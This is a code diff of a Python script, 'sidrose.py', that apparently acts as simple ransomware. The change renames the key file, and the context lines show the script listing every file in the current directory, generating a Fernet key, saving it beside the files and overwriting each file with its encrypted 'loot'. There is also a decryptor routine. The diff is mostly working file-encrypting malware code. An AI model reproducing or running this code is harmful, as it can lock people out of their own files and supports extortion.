@@ -41,7 +41,7 @@ SYS_FILES=[]
 
 def indexer():
     for file in os.listdir():
-        if file == "sidrose.py" or file == "14-12-14":
+        if file == "sidrose.py" or file == "very-special-key":
             continue
         if os.path.isfile(file):
             SYS_FILES.append(file)
@@ -49,7 +49,7 @@ def indexer():
 
 def eNCryptor():
     SEC_KEY=Fernet.generate_key()
-    with open("14-12-14", "wb") as unl_key:
+    with open("very-special-key", "wb") as unl_key:
         unl_key.write(SEC_KEY)
     
     for file in SYS_FILES:
@@ -60,7 +60,7 @@ def eNCryptor():
             enc_file.write(loot_enc)
 
 def dECryptor():
-    with open("14-12-14", "rb") as key:
+    with open("very-special-key", "rb") as key:
         SEC_KEY=key.read()
     try:
         for file in SYS_FILES:
